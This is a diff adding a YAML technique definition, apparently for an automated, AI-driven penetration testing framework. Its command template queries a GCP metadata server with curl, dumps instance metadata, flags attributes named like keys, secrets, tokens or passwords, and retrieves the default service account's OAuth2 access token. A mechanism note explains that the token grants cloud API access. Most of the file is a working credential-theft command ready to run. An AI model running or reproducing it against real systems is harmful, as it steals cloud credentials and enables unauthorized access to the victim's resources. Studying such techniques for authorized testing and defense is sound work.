@@ -1,0 +1,55 @@
+name: gcp_metadata
+category: cloud
+description: Query GCP metadata server for service account tokens and instance attributes
+preconditions:
+- service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: >
+  curl -s --connect-timeout 5
+    -H "Metadata-Flavor: Google"
+    "http://{target_ip}/computeMetadata/v1/?recursive=true&alt=json" 2>&1 |
+    python3 -c "
+  import json, sys
+  raw = sys.stdin.read()
+  try:
+      d = json.loads(raw)
+      inst = d.get('instance', {})
+      print(f'Project: {d.get(\"project\",{}).get(\"projectId\",\"?\")}')
+      print(f'Zone: {inst.get(\"zone\",\"?\")}')
+      print(f'Name: {inst.get(\"name\",\"?\")}')
+      sas = inst.get('serviceAccounts', {})
+      if sas:
+          for sa, info in sas.items():
+              print(f'ServiceAccount: {sa}')
+              scopes = info.get('scopes',[])
+              print(f'  Scopes: {scopes[:3]}')
+      attrs = inst.get('attributes', {})
+      for k,v in attrs.items():
+          if any(x in k.lower() for x in ['key','secret','token','pass','ssh']):
+              print(f'[!] Sensitive attr: {k}={str(v)[:80]}')
+  except:
+      print(raw[:800])
+  ";
+  # Get service account token
+  curl -s -H "Metadata-Flavor: Google"
+    "http://{target_ip}/computeMetadata/v1/instance/service-accounts/default/token" 2>&1
+parser: json_parser
+expected_effects:
+- gcp_metadata_obtained
+- gcp_service_account_token
+- cloud.gcp_token_available
+falsifier:
+  pattern: Connection refused|timed out|403|Metadata-Flavor|not found
+  timeout: 10
+model_tier: haiku
+mechanism: >
+  GCP metadata server at 169.254.169.254 requires 'Metadata-Flavor: Google' header
+  (prevents SSRF from browsers). recursive=true dumps all instance metadata including
+  project ID, zone, service accounts, and custom attributes. The /service-accounts/default/token
+  endpoint returns an OAuth2 access token for the attached service account — valid for 1h
+  and scoped by the instance's service account permissions. This token grants gcloud API
+  access for all services within the granted scope.
+hacktricks_ref: cloud-security/gcp-security/gcp-compute-engine-security.md
+destructive: false
+opsec: low
